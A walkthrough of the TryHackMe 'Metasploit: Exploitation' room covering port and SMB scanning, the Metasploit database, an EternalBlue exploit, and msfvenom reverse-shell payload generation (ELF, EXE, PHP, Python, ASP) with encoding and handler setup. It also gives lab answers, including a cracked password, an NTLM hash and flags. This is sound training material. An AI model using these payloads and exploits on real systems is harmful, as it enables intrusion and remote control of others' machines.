# Metasploit: Exploitation - TryHackMe

> Learning how to use Metasploit for scanning, exploiting, and payload generation

**Room Link:** https://tryhackme.com/room/metasploitexploitation

<img width="1744" height="925" alt="image" src="https://github.com/user-attachments/assets/a4673f31-267f-45fc-8895-5d7473be7f14" />


---

## Task 1: Introduction

In this room, we'll cover:
- Scanning target systems with Metasploit
- Using the Metasploit database
- Vulnerability scanning
- Exploiting vulnerable services
- Creating payloads with msfvenom
- Getting Meterpreter sessions

**Wordlist Location:** `/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`

**No answer needed**

---

## Task 2: Scanning

### Port Scanning

Search for port scanning modules:
```bash
search portscan
```

**Available Port Scanners:**
- `auxiliary/scanner/portscan/tcp` - TCP Port Scanner
- `auxiliary/scanner/portscan/syn` - TCP SYN Port Scanner
- `auxiliary/scanner/portscan/ack` - TCP ACK Firewall Scanner
- `auxiliary/scanner/portscan/xmas` - TCP "XMas" Port Scanner

### Port Scanner Options

```bash
use auxiliary/scanner/portscan/tcp
show options
```

**Key Options:**
- **CONCURRENCY** - Number of targets scanned simultaneously
- **PORTS** - Port range (e.g., 1-10000)
- **RHOSTS** - Target IP address(es)
- **THREADS** - Number of concurrent threads

### Using Nmap from Msfconsole

You can run Nmap directly:
```bash
nmap -sS 10.10.12.229
```

### UDP Service Scanning

```bash
use auxiliary/scanner/discovery/udp_sweep
```

Quickly identifies UDP services like DNS and NetBIOS.

### SMB Scanning

Useful SMB modules:
```bash
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
```

### Questions

**How many ports are open on the target system?**
- Answer: `5`

**Using the relevant scanner, what NetBIOS name can you see?**
- Answer: `ACME IT SUPPORT`

**What is running on port 8000?**
- Answer: `webfs/1.21`

**What is the "penny" user's SMB password?**
- Use: `auxiliary/scanner/smb/smb_login`
- Set the wordlist: `/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`
- Answer: `leo1234`

---

## Task 3: The Metasploit Database

### Starting the Database

```bash
systemctl start postgresql
msfdb init
```

### Check Database Status

```bash
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

### Working with Workspaces

**List workspaces:**
```bash
workspace
```

**Create workspace:**
```bash
workspace -a tryhackme
```

**Switch workspace:**
```bash
workspace default
```

**Delete workspace:**
```bash
workspace -d tryhackme
```

### Database Commands

**Run Nmap and save to database:**
```bash
db_nmap -sV -p- 10.10.12.229
```

**View stored hosts:**
```bash
hosts
```

**View stored services:**
```bash
services
```

**Search for specific services:**
```bash
services -S netbios
```

### Using Database Results

Set RHOSTS from database:
```bash
use auxiliary/scanner/smb/smb_ms17_010
hosts -R
```

This automatically populates RHOSTS with all stored hosts.

**No answer needed**

---

## Task 4: Vulnerability Scanning

Metasploit helps identify "low hanging fruit" - easily exploitable vulnerabilities.

### Example: VNC Scanning

```bash
search vnc
use auxiliary/scanner/vnc/vnc_login
info
```

The `info` command shows module details, options, and references.

### Common Vulnerable Services

- **HTTP** - Web applications (SQL injection, RCE)
- **FTP** - Anonymous login, exposed files
- **SMB** - MS17-010 and other exploits
- **SSH** - Default/weak credentials
- **RDP** - Bluekeep, weak passwords

### Questions

**Who wrote the module that allows us to check SMTP servers for open relay?**
```bash
info auxiliary/scanner/smtp/smtp_relay
```
- Answer: `Campbell Murray`

---

## Task 5: Exploitation

### Finding Exploits

```bash
search apache
use exploit/windows/smb/ms17_010_eternalblue
```

### Viewing Compatible Payloads

```bash
show payloads
```

### Setting Payload

```bash
set payload 2
# or
set payload windows/x64/meterpreter/reverse_tcp
```

### Configuring Options

```bash
show options
set RHOSTS 10.10.12.229
set LHOST 10.10.186.44
set LPORT 4444
```

### Running the Exploit

```bash
exploit
# or
run
```

### Managing Sessions

**Background session:**
```bash
CTRL+Z
# or
background
```

**List sessions:**
```bash
sessions
```

**Interact with session:**
```bash
sessions -i 1
```

### Questions

**What is the content of the flag.txt file?**
- Answer: `THM-5455554845`

**What is the NTLM hash of the password of the user "pirate"?**
- Answer: `8ce9a3ebd1647fcc5e04025019f4b875`

---

## Task 6: Msfvenom

Msfvenom generates payloads in various formats for different systems.

### List Available Payloads

```bash
msfvenom -l payloads
```

### List Output Formats

```bash
msfvenom --list formats
```

### Common Payload Examples

**Linux ELF:**
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f elf > shell.elf
```

**Windows EXE:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f exe > shell.exe
```

**PHP:**
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f raw > shell.php
```

**Python:**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=4444 -f raw > shell.py
```

**ASP:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f asp > shell.asp
```

### Using Encoders

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.X.X -f raw -e php/base64 > shell.php
```

**Note:** Encoders obfuscate payloads but aren't guaranteed to bypass modern antivirus.

### Setting Up Handler

```bash
use exploit/multi/handler
set payload php/reverse_php
set LHOST 10.10.X.X
set LPORT 4444
run
```

### PHP Payload Tips

After generating PHP payload, remember to:
1. Remove comments from the beginning
2. Add PHP opening tag: `<?php`
3. Add closing tag: `?>`

### Questions

**What is the other user's password hash?**
- Answer: `$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0`

---

## Quick Reference

### Scanning Commands

| Command | Purpose |
|---------|---------|
| `search portscan` | Find port scanning modules |
| `use auxiliary/scanner/portscan/tcp` | TCP port scanner |
| `use auxiliary/scanner/discovery/udp_sweep` | UDP service scanner |
| `use auxiliary/scanner/smb/smb_version` | SMB version scanner |
| `nmap -sS [target]` | Run Nmap from msfconsole |

### Database Commands

| Command | Purpose |
|---------|---------|
| `db_status` | Check database connection |
| `workspace -a [name]` | Create workspace |
| `workspace [name]` | Switch workspace |
| `db_nmap [options] [target]` | Run Nmap and save results |
| `hosts` | List stored hosts |
| `services` | List stored services |
| `hosts -R` | Set RHOSTS from database |

### Exploitation Commands

| Command | Purpose |
|---------|---------|
| `show payloads` | List compatible payloads |
| `set payload [name]` | Select payload |
| `exploit` or `run` | Launch exploit |
| `sessions` | List active sessions |
| `sessions -i [ID]` | Interact with session |
| `background` | Background session |

### Msfvenom Examples

| Format | Command |
|--------|---------|
| Linux ELF | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=X LPORT=X -f elf > shell.elf` |
| Windows EXE | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=X LPORT=X -f exe > shell.exe` |
| PHP | `msfvenom -p php/meterpreter/reverse_tcp LHOST=X LPORT=X -f raw > shell.php` |
| Python | `msfvenom -p cmd/unix/reverse_python LHOST=X LPORT=X -f raw > shell.py` |

---

## Key Takeaways

- **Database feature** helps manage multiple targets efficiently
- **db_nmap** automatically saves scan results
- **Workspaces** keep different projects organized
- **Msfvenom** creates payloads for any platform
- **Multi/handler** catches reverse shells
- **Sessions** allow managing multiple connections
- **Encoders** obfuscate payloads (not foolproof)
- Always set **LHOST**, **LPORT**, and **RHOSTS** correctly
